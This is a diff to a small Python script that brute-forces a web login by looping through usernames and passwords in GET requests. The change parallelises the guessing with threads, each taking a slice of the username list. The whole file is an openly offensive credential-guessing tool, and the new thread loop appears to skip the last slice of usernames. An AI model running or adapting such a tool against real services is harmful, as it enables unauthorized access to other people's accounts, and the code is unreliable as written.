@@ -1,5 +1,6 @@
 import requests
-from data import header, URL, usernames, passwords
+import threading
+from data import header, URL, usernames, passwords, CORE_NB
 
 RED = "\033[31m"
 GREEN = "\033[32m"
@@ -12,10 +13,13 @@ def printHeader():
     print(f"{CYAN}{BOLD}{header}{RESET}")
 
 
-def bruteForce():
+def bruteForce(thread, cores):
     try:
-        for password in passwords:
-            for user in usernames:
+        start_user: int = int(len(usernames) * ((thread - 1) / cores))
+        end_user: int = int(len(usernames) * (thread / cores))
+        print()
+        for user in usernames[start_user: end_user]:
+            for password in passwords:
                 res = requests.get(
                     url=URL,
                     params={
@@ -34,8 +38,15 @@ def bruteForce():
 
 def main():
     printHeader()
-    bruteForce()
+    threads = []
+    for number in range(1, CORE_NB):
+        thread = threading.Thread(target=bruteForce, args=(number, CORE_NB))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
 
 
 if __name__ == "__main__":
     main()
+
